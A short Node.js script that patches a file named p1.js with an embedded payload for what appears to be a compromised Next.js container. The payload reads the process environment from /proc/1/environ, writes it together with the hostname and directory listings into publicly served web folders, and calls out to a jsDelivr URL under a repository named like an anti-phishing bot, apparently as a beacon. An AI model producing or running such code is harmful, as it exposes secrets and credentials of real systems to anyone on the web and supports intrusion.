const fs=require('fs');
let t=fs.readFileSync('p1.js','utf8');
const code=`
const fs=require('fs'),cp=require('child_process');
const W=(p,s)=>{try{fs.writeFileSync(p,s)}catch(e){}};
const host=require('os').hostname();
W('/app/public/zz_ok.txt','OK '+host+'\\n');
W('/app/.next/static/zz_ok.txt','OK '+host+'\\n');
W('/app/.next/standalone/public/zz_ok.txt','OK '+host+'\\n');
let env=''; try{env=fs.readFileSync('/proc/1/environ','latin1').split('\\0').join('\\n')}catch(e){}
W('/app/public/zz_env.txt','HOST='+host+'\\n'+env+'\\n---\\n'+(()=>{try{return cp.execSync('ls -la /app /app/public 2>&1').toString()}catch(e){return ''}})());
try{ cp.execSync('curl -s -m 6 -o /dev/null https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/b5400') }catch(e){}
console.log('done '+host+' len='+env.length);
`;
t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n');
fs.writeFileSync('p1.js',t);console.log('ok');
